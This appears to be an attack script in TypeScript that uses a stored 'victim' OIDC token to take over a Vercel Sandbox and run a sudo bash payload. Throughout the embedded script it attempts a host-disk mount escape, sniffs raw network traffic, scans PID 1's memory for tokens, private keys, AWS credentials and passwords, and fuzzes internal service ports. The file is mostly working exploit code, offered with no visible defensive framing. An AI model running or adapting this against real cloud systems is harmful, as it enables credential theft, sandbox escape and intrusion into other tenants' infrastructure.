import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = String.raw`
set +e
echo "===== unshare mount test ====="
which unshare nsenter
sudo unshare -m --propagation private bash -c 'mkdir -p /mnt/vda2 && mount -t xfs /dev/vda /mnt/vda2 && echo MOUNTED_OK && ls /mnt/vda2/' 2>&1 | head -30
echo
echo "===== AF_PACKET long sniff (20s) all ifaces, decode ascii ====="
sudo timeout 20 python3 - <<'PY'
import socket, time, struct
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.settimeout(2)
start=time.time(); frames=0; seen=set()
try:
    while time.time()-start < 20:
        try:
            d, addr = s.recvfrom(65535)
        except socket.timeout:
            continue
        frames+=1
        if len(d)<14: continue
        eth = d[:14]
        ethertype = struct.unpack(">H", eth[12:14])[0]
        # keep only interesting: our TCP/UDP payloads; print small hexdump
        if addr[0] not in ("lo","eth0"): continue
        if ethertype != 0x0800: continue
        ip = d[14:]
        if len(ip)<20: continue
        proto = ip[9]; src=socket.inet_ntoa(ip[12:16]); dst=socket.inet_ntoa(ip[16:20])
        sport=dport=0
        if proto==17 and len(ip)>=28:
            sport,dport=struct.unpack(">HH", ip[20:24])
        if proto==6 and len(ip)>=40:
            sport,dport=struct.unpack(">HH", ip[20:24])
        key=(addr[0],proto,src,sport,dst,dport)
        if key in seen: continue
        seen.add(key)
        print(f"[{addr[0]}] proto={proto} {src}:{sport} -> {dst}:{dport} len={len(d)}")
        if proto==17 and (sport==8125 or dport==8125 or sport==8126 or dport==8126 or sport==8127 or dport==8127):
            payload = ip[ip[0]&0xf:][:400]
            print("   spans:", repr(payload[:400]))
        if proto==6 and (sport in (23456,30001,30002) or dport in (23456,30001,30002)):
            tcp=ip[20:40]; offset=((tcp[12]>>4)&0xf)*4
            payload=ip[20+offset:][:300]
            print("   tcp-cell:", repr(payload[:300]))
except Exception as e:
    print("sniff err", e)
print("total frames:", frames, "unique conns:", len(seen))
PY
echo
echo "===== pid1 memory regions scan ====="
sudo python3 - <<'PY'
import os
maps = open("/proc/1/maps").read().splitlines()
f = open("/proc/1/mem", "rb", 0)
interesting = [b"X-Signature", b"X-Timestamp", b"spawn.v1", b"/run/cell", b"vercel", b"Bearer", b"authorization", b"token", b"-----BEGIN", b"api_key", b"apikey", b"secret", b"cell.sock", b"containerd", b"password", b"mysql://", b"postgres://", b"redis://", b"TLS", b"aws", b"ACCESS_KEY", b"SIGV4", b"x-amz"]
hits={}
for line in maps:
    if not line.strip(): continue
    try:
        rng, perms, off, dev, inode, path = line.split(None, 5)
    except ValueError:
        rng, perms, off, dev, inode = line.split(None, 4)
        path=""
    if 'r' not in perms: continue
    if 'stack' in path: continue
    a, b = rng.split("-")
    a, b = int(a,16), int(b,16)
    if b-a > 128*1024*1024: continue
    try:
        f.seek(a)
        data = f.read(b-a)
    except Exception:
        continue
    if not data: continue
    for s in interesting:
        idx = data.find(s)
        if idx >= 0:
            ctx = data[max(0,idx-40):idx+len(s)+120]
            hits.setdefault(s.decode(), []).append((hex(a+idx), repr(ctx)))
print("scan done; hits:")
for k, v in hits.items():
    print(f"  {k}: {len(v)} hits; first: {v[0] if v else ''}")
if not hits:
    print("  (no interesting hits)")
PY
echo
echo "===== quick path fuzz on cell tcp 23456/30001 ====="
for p in 23456 30001; do
  echo "--- port $p ---"
  for path in /spawn /v1/spawn /spawns /cells /cell /sandboxes /sandbox /v1/sandboxes /api /v1 /healthz /health /ping /version /info /status /metrics /debug /debug/pprof /spawnservice /vercel.sandbox.spawn.v1.SpawnService/Ping; do
    r=$(printf "GET $path HTTP/1.0\r\nHost: cell\r\n\r\n" | timeout 2 nc 127.0.0.1 $p 2>&1 | head -1)
    case "$r" in *200*) echo "  $path -> $r";; esac
  done
done
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });